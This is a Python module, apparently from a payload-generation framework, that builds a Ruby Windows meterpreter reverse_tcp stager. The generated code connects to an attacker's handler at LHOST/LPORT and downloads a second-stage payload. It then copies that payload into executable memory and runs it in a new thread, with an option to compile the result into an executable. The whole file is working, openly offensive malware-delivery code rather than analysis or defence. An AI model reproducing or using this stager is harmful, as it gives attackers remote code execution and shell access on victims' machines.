"""

Custom-written pure ruby meterpreter/reverse_tcp stager.

TODO: better randomization

Module built by @harmj0y

"""

from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["4444", "Port of the Metasploit handler"]
                                }

    def generate(self):

        payloadCode = "require 'rubygems';require 'win32/api';require 'socket';include Win32\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"

        payloadCode += "$v = API.new('VirtualAlloc', 'IIII', 'I');$r = API.new('RtlMoveMemory', 'IPI', 'V');$c = API.new('CreateThread', 'IIIIIP', 'I');$w = API.new('WaitForSingleObject', 'II', 'I')\n"
        payloadCode += "$g_o = API.new('_get_osfhandle', 'I', 'I', 'msvcrt.dll')\n"

        payloadCode += "def g(ip,port)\n"
        payloadCode += "\tbegin\n"
        payloadCode += "\t\ts = TCPSocket.open(ip, port)\n"
        payloadCode += "\t\tpl = Integer(s.recv(4).unpack('L')[0])\n"
        payloadCode += "\t\tp = \"     \"\n"
        payloadCode += "\t\twhile p.length < pl\n\t\tp += s.recv(pl) end\n"
        payloadCode += "\t\tp[0] = ['BF'].pack(\"H*\")\n"
        payloadCode += "\t\tsd = $g_o.call(s.fileno)\n"
        payloadCode += "\t\tfor i in 1..4\n\t\t\tp[i] = Array(sd).pack('V')[i-1] end\n"
        payloadCode += "\t\treturn p\n"
        payloadCode += "\trescue\n\treturn \"\"\n\tend\nend\n"

        payloadCode += "def ij(sc)\n"
        payloadCode += "\tif sc.length > 1000\n"
        payloadCode += "\t\tpt = $v.call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
        payloadCode += "\t\tx = $r.call(pt,sc,sc.length)\n"
        payloadCode += "\t\tx = $w.call($c.call(0,0,pt,0,0,0),0xFFFFFFF)\n"
        payloadCode += "\tend\nend\n"

        payloadCode += "ij(g(\"%s\",%s))" % (self.required_options["LHOST"][0], self.required_options["LPORT"][0])

        return payloadCode
